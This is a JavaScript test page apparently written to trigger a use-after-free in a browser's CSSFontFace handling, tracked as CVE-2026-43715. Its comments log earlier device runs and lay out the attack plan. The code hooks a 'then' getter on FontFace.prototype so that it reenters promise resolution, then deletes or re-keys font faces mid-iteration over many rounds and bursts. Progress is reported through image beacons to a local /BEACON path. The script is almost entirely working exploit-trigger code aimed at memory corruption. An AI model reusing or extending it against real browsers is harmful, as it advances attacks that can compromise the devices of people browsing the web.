// p445 v3 — CVE-2026-43715 CSSFontFace iterateClients UAF device test
// Beacon prefix: V445-
//
// Run 1: getter reentry inside iterateClients confirmed (local(Helvetica)
// only). No crash.
// Run 2: victim style variants (face-rule / use-rule / canvas-lookup /
// unicode-range) x 32 triggers, no crash. Style removal tears down a
// CSS-created face, never a client of OUR JS-created face. Conclusion:
// DOM mutation cannot disconnect our face's clients mid-iteration.
//
// v3 attacks the client relationship directly from JS. The CSSFontFaceSet
// is a client of every face in the set (fontStateChanged ->
// decrementActiveCount). Inside the getter we disconnect the set from the
// face while the loop holds it in the snapshot:
//   del       document.fonts.delete(face) during the callback
//   refamily  face.family = 'x' re-keys the set entry mid-callback
//   both      delete + forced layout (double invalidation)
//   ctrl      style removal only (known-safe control)
// Each round uses a fresh family; 24 rounds, then a repeat burst of the
// best variant (del) with the face also still referenced elsewhere.
//
// Crash signature: beacons stop after V445-THEN-n-<variant>; last tag names
// the disconnect that killed it.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V445-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT3');

  window.onerror = function(msg, src, line, col) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 120) +
      '-L' + line + '-C' + col);
    return false;
  };

  var SRC = 'local(Helvetica)';
  var hits = 0;
  var liveFace = null;
  var mode = 'none';

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits + '-' + mode);
      try {
        if (mode === 'del' || mode === 'both') {
          if (liveFace) { document.fonts.delete(liveFace); B('DELETED-' + mode); }
        }
        if (mode === 'refamily') {
          if (liveFace) { liveFace.family = 'moved' + hits; B('REFAM-' + mode); }
        }
        var victim = document.getElementById('victim-style');
        if (victim) {
          victim.remove();
          document.body.offsetHeight;
          B('REMOVED-' + mode);
        }
        if (mode === 'both') document.body.offsetHeight;
      } catch (e) {
        B('GETTER-ERR-' + encodeURIComponent(String(e)).slice(0, 80));
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  var MODES = ['del', 'refamily', 'both', 'ctrl'];

  function round(i, keep) {
    mode = MODES[i % MODES.length];
    var fam = 'p445g' + i;

    B('R' + i + '-' + mode);

    var s = document.createElement('style');
    s.id = 'victim-style';
    s.textContent = '.sink { font-family: "' + fam + '", serif; }';
    document.head.appendChild(s);
    var sink = document.createElement('div');
    sink.className = 'sink';
    sink.textContent = 'px';
    document.body.appendChild(sink);
    document.body.offsetHeight;

    var face = new FontFace(fam, SRC);
    liveFace = face;
    document.fonts.add(face);
    document.body.offsetHeight;

    face.load().then(
      function(f) {
        B('OK-' + i + '-H' + hits);
        liveFace = null;
        if (!keep) { try { document.fonts.delete(f); } catch (e) {} }
      },
      function(e) {
        B('NO-' + i + '-' + encodeURIComponent(String(e)).slice(0, 80) +
          '-H' + hits);
        liveFace = null;
      }
    );
  }

  var i = 0;
  (function step() {
    if (i >= 24) {
      B('PHASE2');
      // Burst: del mode with faces kept alive and still referenced, so the
      // set teardown and the snapshot disagree maximally.
      MODES = ['del', 'both'];
      var j = 0;
      (function burst() {
        if (j >= 16) { B('DONE-H' + hits); return; }
        round(j, true);
        j++;
        setTimeout(burst, 120);
      })();
      return;
    }
    round(i, false);
    i++;
    setTimeout(step, 500);
  })();
})();
